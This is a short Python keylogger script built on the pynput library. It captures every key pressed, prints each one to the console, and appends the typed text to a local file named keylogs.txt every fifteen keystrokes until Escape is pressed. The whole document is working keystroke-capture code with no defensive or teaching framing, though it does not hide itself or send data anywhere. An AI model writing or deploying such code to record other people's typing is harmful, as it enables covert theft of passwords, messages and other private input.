import pynput
from pynput.keyboard import Key, Listener

# Constants
KEY_LOG_FILE = "keylogs.txt"
KEYSTROKE_THRESHOLD = 15

# Variables
count = 0
keys = []

print("Initializing...")

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
    print(f"{key} pressed")

    # Write to file every KEYSTROKE_THRESHOLD keystrokes
    if count >= KEYSTROKE_THRESHOLD:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    try:
        with open(KEY_LOG_FILE, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "enter" in k:
                    f.write('\n')
                elif "space" in k:
                    f.write(" ")
                elif "Key" not in k:
                    f.write(k)
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up the keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
